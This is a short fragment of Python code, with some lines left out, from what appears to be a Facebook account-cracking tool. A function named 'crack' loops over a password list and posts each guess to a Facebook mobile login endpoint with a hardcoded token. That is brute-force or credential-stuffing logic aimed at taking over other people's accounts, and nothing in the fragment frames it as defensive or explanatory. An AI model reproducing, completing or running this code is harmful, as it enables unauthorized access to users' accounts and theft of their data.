...
def crack(idf,pwx,url,time_xx):
	...
	for pw in pwx:
		try:
			...
			get_method = ses.get(f"https://x.facebook.com/").text
			...
			post_method = ses.post(f"https://x.facebook.com/login/device-based/login/async/?refsrc=deprecated&ht_token=AbsTxxh6if1ljRfTrWB8dW_rUE1lZMLF3WrqjtJlPKtefNP3&h_consent=1&ht_l=login&lwv=100",data=date, headers=head)
